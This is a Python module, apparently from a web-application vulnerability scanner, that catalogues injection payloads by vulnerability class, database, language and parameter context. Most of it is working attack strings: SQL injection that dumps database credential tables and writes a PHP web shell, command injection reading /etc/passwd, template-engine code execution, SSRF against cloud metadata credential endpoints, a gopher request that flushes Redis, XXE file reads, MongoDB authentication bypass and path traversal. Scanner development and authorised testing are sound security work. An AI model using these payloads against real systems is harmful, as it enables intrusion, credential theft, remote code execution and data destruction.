"""
Stack-aware payload library.

Every payload is a dict:
  {
    "name":            short human-readable label,
    "payload":         the literal string to inject,
    "risk":            "benign" | "intrusive",
    "db":              optional tuple of DB engines this payload targets
                       ("mysql", "postgresql", "mssql", "oracle", "sqlite"),
                       or () for engine-agnostic
    "language":        optional tuple of server languages ("php", "java",
                       "python", "dotnet", "node", "ruby", "go") or () for any
    "context":         tuple of injection contexts:
                       "query_param" | "form_param" | "json_body" |
                       "header" | "cookie" | "path_segment"
    "expected_signal": one-line description of what a successful exploit
                       looks like in the response,
    "base_cvss":       intrinsic severity if the payload works,
    "next_steps":      list of suggested follow-up payload names (chaining),
  }

The recommender picks payloads from this library based on the
fingerprinted technology and the parameter context.
"""
from __future__ import annotations

from typing import Any

# ---------------------------------------------------------------------------
# SQLi
# ---------------------------------------------------------------------------

_SQLI: list[dict[str, Any]] = [
    {"name": "Single-quote probe", "payload": "'", "risk": "benign",
     "db": (), "language": (), "context": ("query_param", "form_param", "json_body"),
     "expected_signal": "SQL error / 500 response / response-shape delta",
     "base_cvss": 5.0, "next_steps": ["MySQL time-based", "PostgreSQL time-based"]},

    {"name": "Boolean tautology", "payload": "1 OR 1=1-- -", "risk": "benign",
     "db": (), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "Different (often longer) response body vs id=1",
     "base_cvss": 6.5, "next_steps": ["UNION-based MySQL", "UNION-based PostgreSQL"]},

    {"name": "MySQL time-based", "payload": "1 AND SLEEP(2)-- -", "risk": "intrusive",
     "db": ("mysql",), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "~2s response delta vs baseline",
     "base_cvss": 8.1, "next_steps": ["UNION-based MySQL"]},

    {"name": "PostgreSQL time-based", "payload": "1 AND pg_sleep(2)-- -", "risk": "intrusive",
     "db": ("postgresql",), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "~2s response delta vs baseline",
     "base_cvss": 8.1, "next_steps": ["UNION-based PostgreSQL"]},

    {"name": "MSSQL time-based", "payload": "1; WAITFOR DELAY '0:0:2'-- -", "risk": "intrusive",
     "db": ("mssql",), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "~2s response delta vs baseline",
     "base_cvss": 8.1, "next_steps": []},

    {"name": "UNION-based MySQL", "payload": "1 UNION SELECT user,password,3 FROM mysql.user-- -",
     "risk": "intrusive", "db": ("mysql",), "language": (),
     "context": ("query_param", "form_param"),
     "expected_signal": "Credential rows appear in response body",
     "base_cvss": 9.8, "next_steps": ["MySQL INTO OUTFILE web-shell"]},

    {"name": "UNION-based PostgreSQL", "payload": "1 UNION SELECT usename,passwd,3 FROM pg_shadow-- -",
     "risk": "intrusive", "db": ("postgresql",), "language": (),
     "context": ("query_param", "form_param"),
     "expected_signal": "Postgres role rows appear in response body",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "MySQL INTO OUTFILE web-shell", "payload":
     "1 UNION SELECT '<?php system($_GET[c]);?>',2,3 INTO OUTFILE '/var/www/html/x.php'-- -",
     "risk": "intrusive", "db": ("mysql",), "language": ("php",),
     "context": ("query_param", "form_param"),
     "expected_signal": "subsequent GET /x.php?c=id returns command output",
     "base_cvss": 10.0, "next_steps": []},
]

# ---------------------------------------------------------------------------
# XSS
# ---------------------------------------------------------------------------

_XSS: list[dict[str, Any]] = [
    {"name": "Unique canary", "payload": "argusXSS{nonce}", "risk": "benign",
     "db": (), "language": (), "context": ("query_param", "form_param", "json_body"),
     "expected_signal": "Canary appears verbatim in response body",
     "base_cvss": 5.0, "next_steps": ["HTML angle-bracket probe"]},

    {"name": "HTML angle-bracket probe", "payload": "<argus>", "risk": "benign",
     "db": (), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "Literal <argus> in HTML response (unescaped)",
     "base_cvss": 6.1, "next_steps": ["script tag injection"]},

    {"name": "script tag injection", "payload": "<script>argus=1</script>", "risk": "intrusive",
     "db": (), "language": (), "context": ("query_param", "form_param", "json_body"),
     "expected_signal": "Inline script reflected; browser executes",
     "base_cvss": 6.1, "next_steps": ["cookie exfiltration"]},

    {"name": "event-handler injection", "payload": "\" onerror=argus=1 x=\"", "risk": "intrusive",
     "db": (), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "Reflected inside an HTML attribute that breaks out",
     "base_cvss": 6.1, "next_steps": []},

    {"name": "javascript: href injection", "payload": "javascript:argus=1", "risk": "intrusive",
     "db": (), "language": (), "context": ("query_param",),
     "expected_signal": "Anchor href= becomes a javascript: link",
     "base_cvss": 6.1, "next_steps": []},
]

# ---------------------------------------------------------------------------
# Command injection
# ---------------------------------------------------------------------------

_CMDI: list[dict[str, Any]] = [
    {"name": "Shell metachar probe (semicolon id)", "payload": "127.0.0.1;id",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param", "form_param", "json_body"),
     "expected_signal": "uid=N(...) gid=N(...) echoed in response",
     "base_cvss": 9.8, "next_steps": ["reverse shell"]},

    {"name": "Backtick command substitution", "payload": "`id`", "risk": "intrusive",
     "db": (), "language": (), "context": ("query_param", "form_param"),
     "expected_signal": "uid=N(...) echoed",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "$IFS-bypass", "payload": "127.0.0.1;cat${IFS}/etc/passwd",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param", "form_param"),
     "expected_signal": "root:x:0:0: appears in response",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "Windows command chain", "payload": "127.0.0.1 & whoami", "risk": "intrusive",
     "db": (), "language": ("dotnet",), "context": ("query_param", "form_param"),
     "expected_signal": "domain\\user echoed in response",
     "base_cvss": 9.8, "next_steps": []},
]

# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

_SSTI: list[dict[str, Any]] = [
    {"name": "Generic math probe", "payload": "{{7*7}}", "risk": "benign",
     "db": (), "language": ("python", "node"), "context": ("query_param", "form_param", "json_body"),
     "expected_signal": "Response contains literal '49'",
     "base_cvss": 8.6, "next_steps": ["Jinja2 RCE", "ERB RCE"]},

    {"name": "Dollar-brace math probe", "payload": "${7*7}", "risk": "benign",
     "db": (), "language": ("java",), "context": ("query_param", "form_param"),
     "expected_signal": "Response contains literal '49'",
     "base_cvss": 8.6, "next_steps": ["Freemarker RCE"]},

    {"name": "Razor probe", "payload": "@(7*7)", "risk": "benign",
     "db": (), "language": ("dotnet",), "context": ("query_param", "form_param"),
     "expected_signal": "Response contains literal '49'",
     "base_cvss": 8.6, "next_steps": []},

    {"name": "Jinja2 config dump", "payload": "{{config.items()}}", "risk": "intrusive",
     "db": (), "language": ("python",), "context": ("query_param", "form_param"),
     "expected_signal": "Flask config keys leak in response",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "Freemarker RCE", "payload":
     '<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}',
     "risk": "intrusive", "db": (), "language": ("java",),
     "context": ("form_param", "json_body"),
     "expected_signal": "uid=N(...) echoed",
     "base_cvss": 9.8, "next_steps": []},
]

# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------

_SSRF: list[dict[str, Any]] = [
    {"name": "Localhost loopback", "payload": "http://127.0.0.1/", "risk": "benign",
     "db": (), "language": (), "context": ("query_param", "json_body"),
     "expected_signal": "Internal response leaks vs external URL baseline",
     "base_cvss": 7.5, "next_steps": ["AWS metadata", "GCP metadata", "internal port scan"]},

    {"name": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param", "json_body"),
     "expected_signal": "IAM role names / temporary credentials in response body",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "GCP metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param", "json_body"),
     "expected_signal": "Project / instance metadata in response body",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "file:// LFI via SSRF", "payload": "file:///etc/passwd",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param", "json_body"),
     "expected_signal": "root:x:0:0: in response",
     "base_cvss": 9.1, "next_steps": []},

    {"name": "gopher:// protocol smuggling", "payload": "gopher://127.0.0.1:6379/_FLUSHALL%0d%0a",
     "risk": "intrusive", "db": (), "language": (),
     "context": ("query_param",),
     "expected_signal": "Redis or other internal service responds with +OK or error",
     "base_cvss": 9.8, "next_steps": []},
]

# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------

_XXE: list[dict[str, Any]] = [
    {"name": "Generic XXE file read", "payload":
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
     "risk": "intrusive", "db": (), "language": (),
     "context": ("form_param", "json_body"),
     "expected_signal": "root:x:0:0: in response",
     "base_cvss": 8.6, "next_steps": ["XXE SSRF", "billion laughs"]},

    {"name": "XXE SSRF", "payload":
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/">]><r>&x;</r>',
     "risk": "intrusive", "db": (), "language": (),
     "context": ("form_param", "json_body"),
     "expected_signal": "Internal HTTP response leaks via XML parser",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "Billion laughs", "payload":
     '<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lol>&lol2;</lol>',
     "risk": "intrusive", "db": (), "language": (),
     "context": ("form_param", "json_body"),
     "expected_signal": "Parser timeout / memory error / 500",
     "base_cvss": 7.5, "next_steps": []},
]

# ---------------------------------------------------------------------------
# NoSQL injection
# ---------------------------------------------------------------------------

_NOSQL: list[dict[str, Any]] = [
    {"name": "MongoDB $ne auth bypass", "payload": '{"$ne": null}', "risk": "benign",
     "db": ("mongodb",), "language": (), "context": ("json_body",),
     "expected_signal": "Login succeeds without valid password (auth bypass)",
     "base_cvss": 9.8, "next_steps": ["MongoDB $where eval"]},

    {"name": "MongoDB $regex enumeration", "payload": '{"$regex": "^a"}', "risk": "intrusive",
     "db": ("mongodb",), "language": (), "context": ("json_body",),
     "expected_signal": "Response differs by regex match (char-by-char extraction)",
     "base_cvss": 7.5, "next_steps": []},

    {"name": "MongoDB $where eval", "payload": '{"$where": "this.username == \\"admin\\""}',
     "risk": "intrusive", "db": ("mongodb",), "language": (), "context": ("json_body",),
     "expected_signal": "Server-side JS executes, admin record returned",
     "base_cvss": 9.8, "next_steps": []},
]

# ---------------------------------------------------------------------------
# Insecure deserialization
# ---------------------------------------------------------------------------

_DESERIAL: list[dict[str, Any]] = [
    {"name": "ysoserial CommonsCollections1 gadget", "payload":
     "[use ysoserial.jar CommonsCollections1 to generate]",
     "risk": "intrusive", "db": (), "language": ("java",),
     "context": ("cookie", "form_param", "json_body"),
     "expected_signal": "RCE via deserialized Java gadget chain",
     "base_cvss": 10.0, "next_steps": []},

    {"name": "PHP magic-method POP chain", "payload":
     '[craft O:8:\"ClassName\":1:{...} using app-specific gadget]',
     "risk": "intrusive", "db": (), "language": ("php",),
     "context": ("cookie", "form_param"),
     "expected_signal": "Magic method __wakeup or __destruct triggers gadget",
     "base_cvss": 9.8, "next_steps": []},

    {"name": "Python pickle RCE", "payload":
     '[craft pickle bytes with __reduce__ -> os.system(\"id\")]',
     "risk": "intrusive", "db": (), "language": ("python",),
     "context": ("cookie", "form_param", "json_body"),
     "expected_signal": "Command output appears in response or out-of-band callback",
     "base_cvss": 9.8, "next_steps": []},
]

# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

_PATHTRAV: list[dict[str, Any]] = [
    {"name": "Linux passwd read", "payload": "../../../../etc/passwd", "risk": "intrusive",
     "db": (), "language": (), "context": ("query_param", "path_segment"),
     "expected_signal": "root:x:0:0: in response",
     "base_cvss": 7.5, "next_steps": []},

    {"name": "Windows hosts file", "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     "risk": "intrusive", "db": (), "language": (), "context": ("query_param",),
     "expected_signal": "localhost line returned",
     "base_cvss": 7.5, "next_steps": []},

    {"name": "URL-encoded traversal bypass", "payload": "..%2f..%2f..%2fetc%2fpasswd",
     "risk": "intrusive", "db": (), "language": (), "context": ("query_param",),
     "expected_signal": "passwd contents after URL-decode at one layer only",
     "base_cvss": 7.5, "next_steps": []},
]


# ---------------------------------------------------------------------------
# Public registry
# ---------------------------------------------------------------------------

REGISTRY: dict[str, list[dict[str, Any]]] = {
    "SQLi":               _SQLI,
    "XSS":                _XSS,
    "Command injection":  _CMDI,
    "SSTI":               _SSTI,
    "SSRF":               _SSRF,
    "XXE":                _XXE,
    "NoSQL injection":    _NOSQL,
    "Insecure deserialization": _DESERIAL,
    "Path traversal":     _PATHTRAV,
}


# Parameter-name → likely vuln class. Used when there is NO existing finding
# on an endpoint and we want to suggest a starter probe.
PARAM_HINTS: dict[str, list[str]] = {
    "id": ["SQLi", "IDOR"],
    "user": ["IDOR", "SQLi"],
    "uid": ["IDOR", "SQLi"],
    "url": ["SSRF", "XSS"],
    "redirect": ["SSRF", "Open redirect"],
    "redirect_uri": ["SSRF"],
    "callback": ["SSRF", "XSS"],
    "image_url": ["SSRF"],
    "fetch": ["SSRF"],
    "file": ["Path traversal", "SSRF"],
    "path": ["Path traversal"],
    "name": ["XSS", "SSTI"],
    "q": ["XSS", "SQLi"],
    "query": ["SQLi", "NoSQL injection"],
    "search": ["XSS", "SQLi"],
    "cmd": ["Command injection"],
    "exec": ["Command injection"],
    "host": ["SSRF", "Command injection"],
    "xml": ["XXE"],
    "data": ["Insecure deserialization", "XXE"],
}


def filter_payloads(
    *,
    vuln_class: str,
    db: str | None = None,
    language: str | None = None,
    context: str | None = None,
    intrusive_allowed: bool = False,
) -> list[dict[str, Any]]:
    """Return the payloads from `vuln_class` that match the constraints."""
    out: list[dict[str, Any]] = []
    for p in REGISTRY.get(vuln_class, []):
        if not intrusive_allowed and p["risk"] != "benign":
            continue
        if db and p["db"] and db not in p["db"]:
            continue
        if language and p["language"] and language not in p["language"]:
            continue
        if context and context not in p["context"]:
            continue
        out.append(p)
    return out


if __name__ == "__main__":
    total = sum(len(v) for v in REGISTRY.values())
    print(f"payloads.py registry: {total} payloads across {len(REGISTRY)} classes")
    benign = sum(1 for v in REGISTRY.values() for p in v if p["risk"] == "benign")
    intrusive = total - benign
    print(f"  benign:    {benign}")
    print(f"  intrusive: {intrusive}")
    print("payloads.py smoke test ok")
